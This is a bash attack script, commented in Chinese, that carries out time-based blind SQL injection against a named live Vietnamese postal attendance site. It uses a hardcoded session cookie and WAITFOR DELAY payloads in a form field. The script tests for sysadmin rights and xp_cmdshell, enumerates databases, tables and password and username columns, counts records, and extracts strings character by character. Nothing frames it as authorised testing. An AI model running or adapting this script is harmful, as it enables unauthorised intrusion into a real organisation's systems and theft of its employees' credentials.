#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 通过SQL时间盲注提取敏感数据"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

get_viewstate() {
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
}

# 快速时间盲注函数
blind_extract() {
    local query=$1
    local result=""
    
    # 先获取长度
    for len in {1..100}; do
        PAYLOAD="11'; IF LEN(${query})=${len} WAITFOR DELAY '00:00:02';--"
        
        get_viewstate
        
        start=$(date +%s%N)
        curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
            -X POST \
            -H "Cookie: $COOKIE" \
            --data-urlencode "__VIEWSTATE=$VS" \
            --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
            --data-urlencode "__EVENTVALIDATION=$EV" \
            --data-urlencode "txtThang=${PAYLOAD}" \
            --data-urlencode "txtNam=2025" \
            --data-urlencode "btnExport=Export" \
            -o /dev/null 2>&1
        end=$(date +%s%N)
        
        elapsed=$(( (end - start) / 1000000 ))
        
        if [ $elapsed -gt 1500 ]; then
            echo "    长度: $len"
            break
        fi
    done
    
    # 提取每个字符
    for pos in $(seq 1 $len); do
        # 二分查找ASCII值（加速）
        low=32
        high=126
        
        while [ $low -le $high ]; do
            mid=$(( (low + high) / 2 ))
            
            PAYLOAD="11'; IF ASCII(SUBSTRING(${query},${pos},1))>${mid} WAITFOR DELAY '00:00:01';--"
            
            get_viewstate
            
            start=$(date +%s%N)
            curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
                -X POST \
                -H "Cookie: $COOKIE" \
                --data-urlencode "__VIEWSTATE=$VS" \
                --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
                --data-urlencode "__EVENTVALIDATION=$EV" \
                --data-urlencode "txtThang=${PAYLOAD}" \
                --data-urlencode "txtNam=2025" \
                --data-urlencode "btnExport=Export" \
                -o /dev/null 2>&1
            end=$(date +%s%N)
            
            elapsed=$(( (end - start) / 1000000 ))
            
            if [ $elapsed -gt 800 ]; then
                low=$((mid + 1))
            else
                high=$((mid - 1))
            fi
        done
        
        char=$(printf "\\$(printf '%03o' $low)")
        result="${result}${char}"
        echo -n "$char"
    done
    
    echo ""
    echo "  结果: $result"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[1] 提取数据库基本信息"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  [1.1] 数据库版本..."
# blind_extract "(SELECT @@VERSION)"

echo "  [1.2] 数据库名..."
# blind_extract "(SELECT DB_NAME())"

echo "  [1.3] 当前用户..."
# blind_extract "(SELECT SYSTEM_USER)"

echo "  [1.4] 服务器名..."
# blind_extract "(SELECT @@SERVERNAME)"

# 时间太长，改用快速方法
echo ""
echo "  使用快速方法（检测关键信息）..."

# 检测SA权限
echo ""
echo "  检测是否有SA权限..."
PAYLOAD="11'; IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '00:00:03';--"
get_viewstate
start=$(date +%s%N)
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=${PAYLOAD}" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o /dev/null 2>&1
end=$(date +%s%N)
elapsed=$(( (end - start) / 1000000 ))

if [ $elapsed -gt 2500 ]; then
    echo "    🔥🔥🔥 当前用户有SA权限！"
else
    echo "    ❌ 无SA权限"
fi

# 检测xp_cmdshell是否可用
echo ""
echo "  检测xp_cmdshell..."
PAYLOAD="11'; DECLARE @r INT; EXEC @r=xp_cmdshell 'echo test'; IF @r=0 WAITFOR DELAY '00:00:03';--"
get_viewstate
start=$(date +%s%N)
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=${PAYLOAD}" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o /dev/null 2>&1
end=$(date +%s%N)
elapsed=$(( (end - start) / 1000000 ))

if [ $elapsed -gt 2500 ]; then
    echo "    🔥🔥🔥 xp_cmdshell可用！"
else
    echo "    ❌ xp_cmdshell不可用或被禁用"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[2] 枚举所有数据库"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  检测常见数据库..."

COMMON_DBS=(
    "chamcong"
    "ChamCong"
    "CHAMCONG"
    "vnpost"
    "VNPOST"
    "master"
    "tempdb"
    "model"
    "msdb"
)

for db in "${COMMON_DBS[@]}"; do
    PAYLOAD="11'; IF EXISTS(SELECT 1 FROM sys.databases WHERE name='${db}') WAITFOR DELAY '00:00:02';--"
    
    get_viewstate
    
    start=$(date +%s%N)
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${PAYLOAD}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o /dev/null 2>&1
    end=$(date +%s%N)
    
    elapsed=$(( (end - start) / 1000000 ))
    
    if [ $elapsed -gt 1500 ]; then
        echo "    🔥 数据库存在: $db"
        echo "$db" >> found_databases.txt
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[3] 枚举数据表"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  检测常见表名..."

COMMON_TABLES=(
    "users"
    "Users"
    "USERS"
    "user"
    "User"
    "admin"
    "Admin"
    "account"
    "Account"
    "employee"
    "Employee"
    "nhanvien"
    "NhanVien"
    "taikhoan"
    "TaiKhoan"
)

for table in "${COMMON_TABLES[@]}"; do
    PAYLOAD="11'; IF EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='${table}') WAITFOR DELAY '00:00:02';--"
    
    get_viewstate
    
    start=$(date +%s%N)
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${PAYLOAD}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o /dev/null 2>&1
    end=$(date +%s%N)
    
    elapsed=$(( (end - start) / 1000000 ))
    
    if [ $elapsed -gt 1500 ]; then
        echo "    🔥 表存在: $table"
        echo "$table" >> found_tables.txt
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[4] 检测特定表的列（如果找到users表）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "found_tables.txt" ]; then
    TARGET_TABLE=$(head -1 found_tables.txt)
    echo "  目标表: $TARGET_TABLE"
    echo ""
    echo "  检测常见列..."
    
    COMMON_COLUMNS=(
        "password"
        "Password"
        "pass"
        "pwd"
        "username"
        "Username"
        "userid"
        "UserID"
        "email"
        "Email"
        "matkhau"
        "MatKhau"
        "tendangnhap"
        "TenDangNhap"
    )
    
    for col in "${COMMON_COLUMNS[@]}"; do
        PAYLOAD="11'; IF EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='${TARGET_TABLE}' AND COLUMN_NAME='${col}') WAITFOR DELAY '00:00:02';--"
        
        get_viewstate
        
        start=$(date +%s%N)
        curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
            -X POST \
            -H "Cookie: $COOKIE" \
            --data-urlencode "__VIEWSTATE=$VS" \
            --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
            --data-urlencode "__EVENTVALIDATION=$EV" \
            --data-urlencode "txtThang=${PAYLOAD}" \
            --data-urlencode "txtNam=2025" \
            --data-urlencode "btnExport=Export" \
            -o /dev/null 2>&1
        end=$(date +%s%N)
        
        elapsed=$(( (end - start) / 1000000 ))
        
        if [ $elapsed -gt 1500 ]; then
            echo "    🔥 列存在: $col"
            echo "$col" >> found_columns.txt
        fi
    done
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[5] 提取记录数"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "found_tables.txt" ]; then
    TARGET_TABLE=$(head -1 found_tables.txt)
    
    echo "  统计 $TARGET_TABLE 表的记录数..."
    
    for count in {1..100}; do
        PAYLOAD="11'; IF (SELECT COUNT(*) FROM ${TARGET_TABLE})=${count} WAITFOR DELAY '00:00:02';--"
        
        get_viewstate
        
        start=$(date +%s%N)
        curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
            -X POST \
            -H "Cookie: $COOKIE" \
            --data-urlencode "__VIEWSTATE=$VS" \
            --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
            --data-urlencode "__EVENTVALIDATION=$EV" \
            --data-urlencode "txtThang=${PAYLOAD}" \
            --data-urlencode "txtNam=2025" \
            --data-urlencode "btnExport=Export" \
            -o /dev/null 2>&1
        end=$(date +%s%N)
        
        elapsed=$(( (end - start) / 1000000 ))
        
        if [ $elapsed -gt 1500 ]; then
            echo "    🔥 记录数: $count"
            break
        fi
        
        # 快速检测
        if [ $count -eq 10 ] || [ $count -eq 50 ]; then
            echo "    [$count] 继续..."
        fi
    done
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 数据提取完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 发现的敏感信息:"
echo ""

if [ -f "found_databases.txt" ]; then
    echo "  数据库:"
    cat found_databases.txt | while read db; do
        echo "    - $db"
    done
fi

if [ -f "found_tables.txt" ]; then
    echo ""
    echo "  数据表:"
    cat found_tables.txt | while read tbl; do
        echo "    - $tbl"
    done
fi

if [ -f "found_columns.txt" ]; then
    echo ""
    echo "  列:"
    cat found_columns.txt | while read col; do
        echo "    - $col"
    done
fi
